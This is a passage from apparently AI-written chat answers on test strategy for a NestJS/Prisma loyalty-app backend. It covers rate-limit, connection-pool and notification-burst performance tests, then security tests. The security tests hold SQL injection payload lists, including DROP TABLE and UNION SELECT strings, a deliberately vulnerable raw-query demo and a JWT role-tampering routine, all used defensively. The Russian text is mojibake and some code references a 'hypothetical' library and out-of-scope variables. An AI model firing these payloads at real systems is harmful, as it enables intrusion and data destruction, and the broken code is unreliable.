    await new Promise(resolve => setTimeout(resolve, 30000));

    // Still rate limited (within 1-minute window)
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(429);

    // Wait another 31 seconds (total 61 seconds)
    await new Promise(resolve => setTimeout(resolve, 31000));

    // Should work now (outside 1-minute window)
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    console.log('Sliding window rate limiting works correctly');
  });

  // Test 10: Rate Limit Bypass for Admin
  it('should not rate limit admin users', async () => {
    const adminToken = generateAdminToken('tenant-1');

    // Make 200 requests (exceeds normal limit)
    for (let i = 0; i < 200; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/admin/guests')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);
    }

    console.log('Admin users bypass rate limits');
  });
});

function generateGuestToken(tenantId: string): string {
  return jwt.sign(
    { userId: 'user-1', role: 'GUEST', tenantId },
    process.env.JWT_SECRET
  );
}

function generateAdminToken(tenantId: string): string {
  return jwt.sign(
    { userId: 'admin-1', role: 'ADMIN', tenantId },
    process.env.JWT_SECRET
  );
}
```


***

### **29. Database Connection Pool - exhaustion?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Prisma connection pool = 10 connections.

**–í–æ–ø—Ä–æ—Å:** Load test?

- A) 5 concurrent queries ‚Üí all succeed
- B) 10 concurrent queries ‚Üí all succeed (pool full)
- C) 20 concurrent queries ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å queuing (–Ω–µ –ø–∞–¥–∞–µ—Ç)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å timeout –µ—Å–ª–∏ pool saturated > 30sec

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Connection pool exhaustion = —Ä–µ–∞–ª—å–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞ –≤ production
- Query queuing –¥–æ–ª–∂–µ–Ω —Ä–∞–±–æ—Ç–∞—Ç—å –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ
- Timeout –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç hanging requests

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/performance/connection-pool.perf.spec.ts
describe('Database Connection Pool - Performance Testing', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Under Pool Limit (5 concurrent queries)
  it('should handle 5 concurrent queries', async () => {
    const startTime = performance.now();

    const promises = Array(5).fill(null).map(() =>
      prisma.guestCard.findMany({ take: 10 })
    );

    await Promise.all(promises);

    const duration = performance.now() - startTime;

    console.log('=== 5 Concurrent Queries ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);

    expect(duration).toBeLessThan(1000);
  });

  // Test 2: At Pool Limit (10 concurrent queries)
  it('should handle 10 concurrent queries (pool full)', async () => {
    const startTime = performance.now();

    const promises = Array(10).fill(null).map(() =>
      prisma.guestCard.findMany({ take: 10 })
    );

    await Promise.all(promises);

    const duration = performance.now() - startTime;

    console.log('=== 10 Concurrent Queries (Pool Full) ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);

    expect(duration).toBeLessThan(2000);
  });

  // Test 3: Exceed Pool Limit (20 concurrent queries)
  it('should queue queries when pool exhausted', async () => {
    const startTime = performance.now();

    const promises = Array(20).fill(null).map(async (_, i) => {
      const queryStart = performance.now();
      
      await prisma.guestCard.findMany({ take: 10 });
      
      const queryDuration = performance.now() - queryStart;
      return { index: i, duration: queryDuration };
    });

    const results = await Promise.all(promises);
    const totalDuration = performance.now() - startTime;

    const avgDuration = results.reduce((sum, r) => sum + r.duration, 0) / results.length;
    const maxDuration = Math.max(...results.map(r => r.duration));

    console.log('=== 20 Concurrent Queries (Queuing) ===');
    console.log(`Total duration: ${totalDuration.toFixed(2)}ms`);
    console.log(`Avg query duration: ${avgDuration.toFixed(2)}ms`);
    console.log(`Max query duration: ${maxDuration.toFixed(2)}ms`);

    // Some queries should be queued (higher duration)
    expect(maxDuration).toBeGreaterThan(avgDuration * 1.5);
    expect(totalDuration).toBeLessThan(5000);
  });

  // Test 4: Long-Running Query Blocks Pool
  it('should handle long-running queries gracefully', async () => {
    const startTime = performance.now();

    // Start 1 long-running query
    const longQuery = prisma.$queryRaw`SELECT pg_sleep(5)`; // 5 seconds

    // Start 10 short queries after 1 second
    await new Promise(resolve => setTimeout(resolve, 1000));

    const shortQueries = Array(10).fill(null).map(() =>
      prisma.guestCard.findMany({ take: 10 })
    );

    // Both should complete
    await Promise.all([longQuery, ...shortQueries]);

    const duration = performance.now() - startTime;

    console.log('=== Long-Running Query Test ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);

    // Should complete in ~5 seconds (not blocked)
    expect(duration).toBeLessThan(7000);
  });

  // Test 5: Connection Timeout
  it('should timeout queries after 30 seconds', async () => {
    jest.setTimeout(35000);

    // Fill pool with stuck queries
    const stuckQueries = Array(10).fill(null).map(() =>
      prisma.$queryRaw`SELECT pg_sleep(60)` // 60 seconds (will timeout)
    );

    // Try to execute query while pool is stuck
    const timeoutStart = performance.now();

    try {
      await prisma.guestCard.findMany({ take: 10 });
    } catch (error) {
      const duration = performance.now() - timeoutStart;
      
      console.log('=== Connection Timeout ===');
      console.log(`Timeout after: ${duration.toFixed(2)}ms`);
      console.log(`Error: ${error.message}`);

      // Should timeout around 30 seconds
      expect(duration).toBeGreaterThan(28000);
      expect(duration).toBeLessThan(32000);
      expect(error.message).toContain('timeout');
    }

    // Cleanup stuck queries
    await Promise.allSettled(stuckQueries);
  });

  // Test 6: Monitor Active Connections
  it('should monitor connection pool metrics', async () => {
    // Get initial connection count
    const initialCount = await getActiveConnections();

    console.log(`Initial connections: ${initialCount}`);

    // Execute queries
    await Promise.all(
      Array(10).fill(null).map(() =>
        prisma.guestCard.findMany({ take: 10 })
      )
    );

    // Get peak connection count
    const peakCount = await getActiveConnections();

    console.log(`Peak connections: ${peakCount}`);

    // Wait for connections to be released
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Get final connection count
    const finalCount = await getActiveConnections();

    console.log(`Final connections: ${finalCount}`);

    // Pool should not leak connections
    expect(finalCount).toBeLessThanOrEqual(initialCount + 2);
  });

  // Test 7: Connection Pool with PgBouncer
  it('should work efficiently with PgBouncer', async () => {
    // PgBouncer provides connection pooling at PostgreSQL level
    // Prisma pool (10) -> PgBouncer pool (100) -> PostgreSQL

    const queries = Array(50).fill(null).map(() =>
      prisma.guestCard.findMany({ take: 10 })
    );

    const startTime = performance.now();
    await Promise.all(queries);
    const duration = performance.now() - startTime;

    console.log('=== With PgBouncer ===');
    console.log(`50 concurrent queries: ${duration.toFixed(2)}ms`);

    // Should handle 50 queries efficiently with PgBouncer
    expect(duration).toBeLessThan(5000);
  });

  // Test 8: Transaction Pool Pressure
  it('should handle concurrent transactions', async () => {
    const transactions = Array(20).fill(null).map(async (_, i) => {
      return prisma.$transaction(async (tx) => {
        await tx.guestCard.findMany({ take: 10 });
        await tx.ballTransaction.findMany({ take: 10 });
        return i;
      });
    });

    const startTime = performance.now();
    const results = await Promise.all(transactions);
    const duration = performance.now() - startTime;

    console.log('=== 20 Concurrent Transactions ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Completed: ${results.length}`);

    expect(results).toHaveLength(20);
    expect(duration).toBeLessThan(10000);
  });

  // Test 9: Pool Starvation Detection
  it('should detect pool starvation', async () => {
    const warnings: string[] = [];

    // Mock logger to capture warnings
    const logger = app.get('Logger');
    const originalWarn = logger.warn;
    logger.warn = jest.fn((message) => {
      warnings.push(message);
      originalWarn.call(logger, message);
    });

    // Create pool starvation (30 queries on 10 connection pool)
    const queries = Array(30).fill(null).map(() =>
      prisma.$queryRaw`SELECT pg_sleep(1)`
    );

    await Promise.all(queries);

    // Restore logger
    logger.warn = originalWarn;

    console.log('=== Pool Starvation Detection ===');
    console.log(`Warnings: ${warnings.length}`);

    // Should log warnings about pool pressure
    expect(warnings.some(w => w.includes('pool') || w.includes('connection'))).toBe(true);
  });
});

async function getActiveConnections(): Promise<number> {
  const result = await prisma.$queryRaw<[{ count: bigint }]>`
    SELECT COUNT(*) as count
    FROM pg_stat_activity
    WHERE datname = current_database()
      AND state = 'active';
  `;
  return Number(result[0].count);
}
```


***

### **30. Notification Sending - burst traffic?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Promo campaign ‚Üí 10,000 notifications –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ.

**–í–æ–ø—Ä–æ—Å:** Load test?

- A) Send 100 notifications ‚Üí check delivery rate
- B) Send 10,000 notifications ‚Üí check queue saturation
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å rate limits external providers (Telegram, Email)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å fallback –µ—Å–ª–∏ provider unavailable

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Burst campaigns = realistic scenario (Black Friday)
- External provider rate limits –∫—Ä–∏—Ç–∏—á–Ω—ã
- Fallback provider = production resilience

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/performance/notification-burst.perf.spec.ts
import { Queue, Worker } from 'bullmq';

describe('Notification Sending - Burst Traffic', () => {
  let app: INestApplication;
  let queue: Queue;
  let worker: Worker;
  let redis: Redis;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    redis = app.get('REDIS');
    queue = app.get('BullQueue_notifications');

    // Start worker
    worker = new Worker(
      'notifications',
      async (job) => {
        // Simulate notification sending
        await new Promise(resolve => setTimeout(resolve, 100));
        return { success: true };
      },
      {
        connection: redis,
        concurrency: 10,
      }
    );
  });

  afterAll(async () => {
    await worker.close();
    await app.close();
  });

  beforeEach(async () => {
    await queue.obliterate();
  });

  // Test 1: Small Burst (100 notifications)
  it('should handle 100 notifications burst', async () => {
    jest.setTimeout(30000);

    const startTime = Date.now();

    // Add 100 notifications
    const jobs = Array(100).fill(null).map((_, i) => ({
      name: 'send-notification',
      data: {
        guestId: `user-${i}`,
        type: 'BALLS_EARNED',
        channel: 'TELEGRAM',
        message: `Test notification ${i}`,
      },
    }));

    await queue.addBulk(jobs);

    // Wait for completion
    while (true) {
      const counts = await queue.getJobCounts('completed', 'failed');
      if (counts.completed + counts.failed >= 100) break;
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    const duration = Date.now() - startTime;
    const throughput = (100 / duration) * 1000;

    console.log('=== 100 Notifications Burst ===');
    console.log(`Duration: ${duration}ms`);
    console.log(`Throughput: ${throughput.toFixed(2)} notifications/sec`);

    const counts = await queue.getJobCounts('completed', 'failed');
    expect(counts.completed).toBeGreaterThan(95);
  });

  // Test 2: Large Burst (10,000 notifications)
  it('should handle 10,000 notifications campaign', async () => {
    jest.setTimeout(300000); // 5 minutes

    console.log('Starting 10,000 notifications campaign...');

    const startTime = Date.now();

    // Add in batches
    for (let batch = 0; batch < 10; batch++) {
      const jobs = Array(1000).fill(null).map((_, i) => ({
        name: 'send-notification',
        data: {
          guestId: `user-${batch * 1000 + i}`,
          type: 'PROMO_AVAILABLE',
          channel: 'TELEGRAM',
          message: `Promo notification ${batch * 1000 + i}`,
        },
      }));

      await queue.addBulk(jobs);
      console.log(`Added batch ${batch + 1}/10`);
    }

    const enqueueTime = Date.now() - startTime;
    console.log(`Enqueued in ${enqueueTime}ms`);

    // Monitor progress
    const progressInterval = setInterval(async () => {
      const counts = await queue.getJobCounts('completed', 'failed', 'active', 'waiting');
      console.log(`Progress: ${counts.completed + counts.failed}/10000 (active: ${counts.active}, waiting: ${counts.waiting})`);
    }, 5000);

    // Wait for completion
    while (true) {
      const counts = await queue.getJobCounts('completed', 'failed');
      if (counts.completed + counts.failed >= 10000) break;
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    clearInterval(progressInterval);

    const totalDuration = Date.now() - startTime;
    const throughput = (10000 / totalDuration) * 1000;

    console.log('=== 10,000 Notifications Campaign ===');
    console.log(`Total duration: ${totalDuration}ms`);
    console.log(`Throughput: ${throughput.toFixed(2)} notifications/sec`);

    const counts = await queue.getJobCounts('completed', 'failed');
    console.log(`Completed: ${counts.completed}`);
    console.log(`Failed: ${counts.failed}`);

    expect(counts.completed).toBeGreaterThan(9500); // > 95% success
  });

  // Test 3: Telegram Rate Limit Handling
  it('should handle Telegram API rate limits', async () => {
    jest.setTimeout(60000);

    const telegramService = app.get('TelegramService');
    
    let requestCount = 0;
    let rateLimitCount = 0;

    // Mock Telegram API with rate limiting
    jest.spyOn(telegramService, 'sendMessage').mockImplementation(async () => {
      requestCount++;

      // Telegram limit: 30 messages/second
      if (requestCount % 30 === 0) {
        rateLimitCount++;
        throw {
          response: {
            status: 429,
            data: {
              retry_after: 1, // Wait 1 second
            },
          },
        };
      }

      return { ok: true };
    });

    // Send 100 notifications rapidly
    const jobs = Array(100).fill(null).map((_, i) => ({
      name: 'send-notification',
      data: {
        guestId: `user-${i}`,
        type: 'BALLS_EARNED',
        channel: 'TELEGRAM',
        message: `Test ${i}`,
      },
    }));

    await queue.addBulk(jobs);

    // Wait for completion
    while (true) {
      const counts = await queue.getJobCounts('completed', 'failed');
      if (counts.completed + counts.failed >= 100) break;
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    console.log('=== Telegram Rate Limit Test ===');
    console.log(`Total requests: ${requestCount}`);
    console.log(`Rate limited: ${rateLimitCount}`);

    // Should handle rate limits gracefully
    const counts = await queue.getJobCounts('completed');
    expect(counts.completed).toBeGreaterThan(90);
  });

  // Test 4: Channel Fallback (Telegram ‚Üí SMS)
  it('should fallback to SMS when Telegram fails', async () => {
    jest.setTimeout(60000);

    const telegramService = app.get('TelegramService');
    const smsService = app.get('SmsService');

    let telegramAttempts = 0;
    let smsAttempts = 0;

    // Mock Telegram failures
    jest.spyOn(telegramService, 'sendMessage').mockRejectedValue(
      new Error('Telegram service unavailable')
    );

    // Mock SMS success
    jest.spyOn(smsService, 'send').mockResolvedValue({ success: true });

    // Send 50 notifications
    const jobs = Array(50).fill(null).map((_, i) => ({
      name: 'send-notification',
      data: {
        guestId: `user-${i}`,
        phone: '+79991234567',
        type: 'BALLS_EARNED',
        channels: ['TELEGRAM', 'SMS'], // Fallback chain
        message: `Test ${i}`,
      },
    }));

    await queue.addBulk(jobs);

    // Wait for completion
    while (true) {
      const counts = await queue.getJobCounts('completed', 'failed');
      if (counts.completed + counts.failed >= 50) break;
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    telegramAttempts = telegramService.sendMessage.mock.calls.length;
    smsAttempts = smsService.send.mock.calls.length;

    console.log('=== Channel Fallback Test ===');
    console.log(`Telegram attempts: ${telegramAttempts}`);
    console.log(`SMS fallbacks: ${smsAttempts}`);

    // Should have attempted Telegram and fallen back to SMS
    expect(telegramAttempts).toBeGreaterThan(0);
    expect(smsAttempts).toBeGreaterThan(40); // Most should fallback
  });

  // Test 5: Priority Queue (Critical vs Normal)
  it('should prioritize critical notifications', async () => {
    jest.setTimeout(30000);

    const processOrder: string[] = [];

    const priorityWorker = new Worker(
      'notifications',
      async (job) => {
        processOrder.push(job.data.priority);
        await new Promise(resolve => setTimeout(resolve, 100));
        return { success: true };
      },
      { connection: redis, concurrency: 1 }
    );

    // Add mixed priority notifications
    await queue.addBulk([
      { name: 'send', data: { priority: 'NORMAL' }, opts: { priority: 5 } },
      { name: 'send', data: { priority: 'CRITICAL' }, opts: { priority: 1 } },
      { name: 'send', data: { priority: 'LOW' }, opts: { priority: 10 } },
      { name: 'send', data: { priority: 'HIGH' }, opts: { priority: 3 } },
      { name: 'send', data: { priority: 'NORMAL' }, opts: { priority: 5 } },
    ]);

    // Wait for processing
    await new Promise(resolve => setTimeout(resolve, 3000));

    console.log('=== Priority Queue Test ===');
    console.log(`Process order: ${processOrder.join(' ‚Üí ')}`);

    expect(processOrder[0]).toBe('CRITICAL');
    expect(processOrder[processOrder.length - 1]).toBe('LOW');

    await priorityWorker.close();
  });

  // Test 6: Delivery Latency Distribution
  it('should measure notification delivery latency', async () => {
    jest.setTimeout(60000);

    const latencies: number[] = [];
    const enqueueTimes = new Map<string, number>();

    // Add 1000 notifications
    for (let i = 0; i < 1000; i++) {
      const job = await queue.add('send-notification', {
        guestId: `user-${i}`,
        message: `Test ${i}`,
      });
      enqueueTimes.set(job.id, Date.now());
    }

    // Track completion times
    worker.on('completed', (job) => {
      const enqueueTime = enqueueTimes.get(job.id);
      if (enqueueTime) {
        latencies.push(Date.now() - enqueueTime);
      }
    });

    // Wait for completion
    while (latencies.length < 1000) {
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    // Calculate percentiles
    latencies.sort((a, b) => a - b);
    const p50 = latencies[Math.floor(latencies.length * 0.5)];
    const p95 = latencies[Math.floor(latencies.length * 0.95)];
    const p99 = latencies[Math.floor(latencies.length * 0.99)];
    const avg = latencies.reduce((a, b) => a + b, 0) / latencies.length;

    console.log('=== Delivery Latency Distribution ===');
    console.log(`Average: ${avg.toFixed(2)}ms`);
    console.log(`p50: ${p50}ms`);
    console.log(`p95: ${p95}ms`);
    console.log(`p99: ${p99}ms`);

    expect(p95).toBeLessThan(5000); // p95 < 5s
    expect(p99).toBeLessThan(10000); // p99 < 10s
  });
});
```


***

## **–ë–õ–û–ö 6: SECURITY TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**

–ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ Security Testing (–≤–æ–ø—Ä–æ—Å—ã 31-40)? üöÄ

---

# –ü—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

## **–ë–õ–û–ö 6: SECURITY TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**


***

### **31. SQL Injection - Prisma –∑–∞—â–∏—â–∞–µ—Ç?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Query: `prisma.user.findMany({ where: { phone: userInput } })`

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å SQL injection?

- A) –ù–∞–¥–µ—è—Ç—å—Å—è —á—Ç–æ Prisma –∑–∞—â–∏—â–∞–µ—Ç
- B) Manual test: –ø–µ—Ä–µ–¥–∞—Ç—å `' OR 1=1 --` –≤ phone field
- C) Automated test: fuzzing —Å SQL injection payloads
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å raw queries (`$queryRaw`) —Å sanitization

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Prisma –∑–∞—â–∏—â–∞–µ—Ç –æ—Ç SQL injection –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
- –ù–û: `$queryRaw` —Å user input = —É—è–∑–≤–∏–º–æ—Å—Ç—å
- Automated fuzzing –Ω–∞—Ö–æ–¥–∏—Ç edge cases

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/security/sql-injection.security.spec.ts
describe('SQL Injection - Security Testing', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);

    // Seed test data
    await prisma.user.create({
      data: {
        id: 'user-1',
        phone: '+79991234567',
        role: 'GUEST',
        phoneVerified: true,
      },
    });
  });

  afterAll(async () => {
    await prisma.user.deleteMany();
    await app.close();
  });

  // Test 1: Basic SQL Injection (Prisma protects)
  it('should prevent basic SQL injection in Prisma queries', async () => {
    const maliciousInput = "' OR '1'='1"; // Classic SQL injection

    const users = await prisma.user.findMany({
      where: {
        phone: maliciousInput,
      },
    });

    // Prisma treats it as literal string, not SQL
    expect(users).toHaveLength(0); // No users found
  });

  // Test 2: SQL Injection Payloads (Comprehensive)
  it('should block common SQL injection payloads', async () => {
    const payloads = [
      "' OR 1=1 --",
      "' OR '1'='1",
      "admin'--",
      "' OR 'a'='a",
      "1' UNION SELECT NULL--",
      "' DROP TABLE users--",
      "'; DELETE FROM users WHERE '1'='1",
      "' AND 1=0 UNION ALL SELECT NULL, NULL--",
      "admin' /*",
      "' OR EXISTS(SELECT * FROM users)--",
    ];

    for (const payload of payloads) {
      const users = await prisma.user.findMany({
        where: { phone: payload },
      });

      expect(users).toHaveLength(0);
    }

    console.log(`‚úÖ Tested ${payloads.length} SQL injection payloads - all blocked`);
  });

  // Test 3: Raw Query Vulnerability (DANGEROUS)
  it('should demonstrate raw query vulnerability', async () => {
    const userInput = "' OR '1'='1"; // Malicious input

    // ‚ùå VULNERABLE CODE (for demonstration)
    try {
      const unsafeQuery = `
        SELECT * FROM "User"
        WHERE phone = '${userInput}'
      `;

      const users = await prisma.$queryRawUnsafe(unsafeQuery);

      // This WILL execute: SELECT * FROM "User" WHERE phone = '' OR '1'='1'
      // Returns ALL users (SQL injection successful!)
      expect(users.length).toBeGreaterThan(0); // Demonstrates vulnerability
      
      console.log('‚ö†Ô∏è SQL Injection successful in raw query!');
    } catch (error) {
      // Expected to fail in safe environment
    }
  });

  // Test 4: Safe Raw Query (Parameterized)
  it('should use parameterized queries for raw SQL', async () => {
    const userInput = "' OR '1'='1";

    // ‚úÖ SAFE: Parameterized query
    const users = await prisma.$queryRaw`
      SELECT * FROM "User"
      WHERE phone = ${userInput}
    `;

    // Prisma treats $userInput as parameter, not SQL
    expect(users).toHaveLength(0);
    console.log('‚úÖ Parameterized query blocked SQL injection');
  });

  // Test 5: Second-Order SQL Injection
  it('should prevent second-order SQL injection', async () => {
    // Step 1: Store malicious data
    const maliciousName = "'; DROP TABLE users--";

    await prisma.user.create({
      data: {
        id: 'user-malicious',
        phone: '+79997777777',
        role: 'GUEST',
        phoneVerified: true,
        guestProfile: {
          create: {
            firstName: maliciousName, // Store malicious payload
          },
        },
      },
    });

    // Step 2: Retrieve and use in query (should be safe)
    const user = await prisma.user.findUnique({
      where: { id: 'user-malicious' },
      include: { guestProfile: true },
    });

    // Step 3: Use retrieved data in another query
    const searchResults = await prisma.user.findMany({
      where: {
        guestProfile: {
          firstName: user.guestProfile.firstName, // Malicious data used here
        },
      },
    });

    // Prisma parameterizes, so this is safe
    expect(searchResults).toHaveLength(1);
    
    // Verify table still exists
    const allUsers = await prisma.user.findMany();
    expect(allUsers.length).toBeGreaterThan(0);

    console.log('‚úÖ Second-order SQL injection blocked');
  });

  // Test 6: NoSQL Injection (MongoDB-style)
  it('should prevent NoSQL injection attempts', async () => {
    // NoSQL injection payloads (if using raw JSON queries)
    const noSqlPayloads = [
      { $gt: '' }, // Greater than empty string (returns all)
      { $ne: null }, // Not equal to null (returns all)
      { $regex: '.*' }, // Regex match all
    ];

    for (const payload of noSqlPayloads) {
      // Prisma doesn't interpret these as operators
      const users = await prisma.user.findMany({
        where: {
          phone: payload as any,
        },
      });

      expect(users).toHaveLength(0);
    }

    console.log('‚úÖ NoSQL injection payloads blocked');
  });

  // Test 7: LIKE Injection
  it('should sanitize LIKE queries', async () => {
    const maliciousInput = "%' OR '1'='1"; // Try to inject via LIKE

    const users = await prisma.user.findMany({
      where: {
        phone: {
          startsWith: maliciousInput,
        },
      },
    });

    expect(users).toHaveLength(0);
    console.log('‚úÖ LIKE injection blocked');
  });

  // Test 8: Unicode SQL Injection
  it('should block unicode SQL injection', async () => {
    const unicodePayloads = [
      "' OR 1=1‚Äî", // Em dash instead of hyphen
      "' OR '1'='1' ‚Äî",
      "\u0027 OR 1=1--", // Unicode apostrophe
    ];

    for (const payload of unicodePayloads) {
      const users = await prisma.user.findMany({
        where: { phone: payload },
      });

      expect(users).toHaveLength(0);
    }

    console.log('‚úÖ Unicode SQL injection blocked');
  });

  // Test 9: Automated Fuzzing
  it('should fuzz SQL injection vectors', async () => {
    const sqlmap = require('sqlmap'); // Hypothetical fuzzing library

    const results = await fuzzSqlInjection({
      endpoint: '/api/v1/auth/login',
      parameter: 'phone',
      payloadCount: 1000,
    });

    console.log('=== SQL Injection Fuzzing ===');
    console.log(`Payloads tested: ${results.total}`);
    console.log(`Vulnerabilities found: ${results.vulnerabilities.length}`);

    expect(results.vulnerabilities).toHaveLength(0);
  });

  // Test 10: Code Review - Raw Query Detection
  it('should detect unsafe raw queries in codebase', async () => {
    const fs = require('fs');
    const path = require('path');

    const unsafePatterns = [
      /\$queryRawUnsafe/g,
      /\$executeRawUnsafe/g,
      /`SELECT.*\$\{.*\}`/g, // Template literal injection
    ];

    const codebasePath = path.join(__dirname, '../../../src');
    const violations: string[] = [];

    function scanDirectory(dir: string) {
      const files = fs.readdirSync(dir);

      for (const file of files) {
        const filePath = path.join(dir, file);
        const stat = fs.statSync(filePath);

        if (stat.isDirectory()) {
          scanDirectory(filePath);
        } else if (file.endsWith('.ts')) {
          const content = fs.readFileSync(filePath, 'utf8');

          for (const pattern of unsafePatterns) {
            const matches = content.match(pattern);
            if (matches) {
              violations.push(`${filePath}: ${matches.join(', ')}`);
            }
          }
        }
      }
    }

    scanDirectory(codebasePath);

    console.log('=== Unsafe Raw Query Detection ===');
    if (violations.length > 0) {
      console.log('‚ö†Ô∏è Found unsafe patterns:');
      violations.forEach(v => console.log(`  - ${v}`));
    } else {
      console.log('‚úÖ No unsafe raw queries detected');
    }

    // In strict mode, fail if any unsafe patterns found
    // expect(violations).toHaveLength(0);
  });
});

// Helper function
async function fuzzSqlInjection(options: any): Promise<any> {
  // Simulated fuzzing
  const payloads = generateSqlInjectionPayloads(options.payloadCount);
  const vulnerabilities: any[] = [];

  for (const payload of payloads) {
    const response = await request(app.getHttpServer())
      .post(options.endpoint)
      .send({ [options.parameter]: payload });

    // Check for SQL error messages
    if (
      response.status === 500 &&
      (response.text.includes('SQL syntax') ||
       response.text.includes('database error'))
    ) {
      vulnerabilities.push({
        payload,
        response: response.text,
      });
    }
  }

  return {
    total: payloads.length,
    vulnerabilities,
  };
}

function generateSqlInjectionPayloads(count: number): string[] {
  const templates = [
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users--",
    "' AND 1=0 UNION ALL SELECT NULL--",
  ];

  const payloads: string[] = [];

  for (let i = 0; i < count; i++) {
    const template = templates[i % templates.length];
    payloads.push(template);
  }

  return payloads;
}
```


***

### **32. JWT Token Security - token hijacking?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** JWT token –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è authentication.

**–í–æ–ø—Ä–æ—Å:** Security tests?

- A) Verify JWT signature
- B) Test token expiration (–ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ expired tokens rejected)
- C) B + test token tampering (–∏–∑–º–µ–Ω–∏—Ç—å payload ‚Üí rejected)
- D) C + test token theft (–ø—Ä–æ–≤–µ—Ä–∏—Ç—å refresh token rotation)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- JWT tampering –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –Ω–µ–≤–æ–∑–º–æ–∂–µ–Ω (signature verification)
- Token expiration –∫—Ä–∏—Ç–∏—á–µ–Ω –¥–ª—è security
- Refresh token rotation –∑–∞—â–∏—â–∞–µ—Ç –æ—Ç token theft

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/security/jwt-security.security.spec.ts
import * as jwt from 'jsonwebtoken';

describe('JWT Token Security', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Valid Token
  it('should accept valid JWT token', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    expect(response.body).toBeDefined();
  });

  // Test 2: Expired Token
  it('should reject expired JWT token', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET,
      { expiresIn: '-1h' } // Expired 1 hour ago
    );

    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(401);

    expect(response.body.message).toContain('expired');
  });

  // Test 3: Token Tampering (Modified Payload)
  it('should reject tampered JWT token', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    // Decode and modify payload
    const [header, payload, signature] = token.split('.');
    const decodedPayload = JSON.parse(Buffer.from(payload, 'base64').toString());
    
    // Change role to ADMIN
    decodedPayload.role = 'ADMIN';
    
    const tamperedPayload = Buffer.from(JSON.stringify(decodedPayload)).toString('base64');
    const tamperedToken = `${header}.${tamperedPayload}.${signature}`;

    const response = await request(app.getHttpServer())
      .get('/api/v1/admin/guests')
      .set('Authorization', `Bearer ${tamperedToken}`)
      .expect(401);

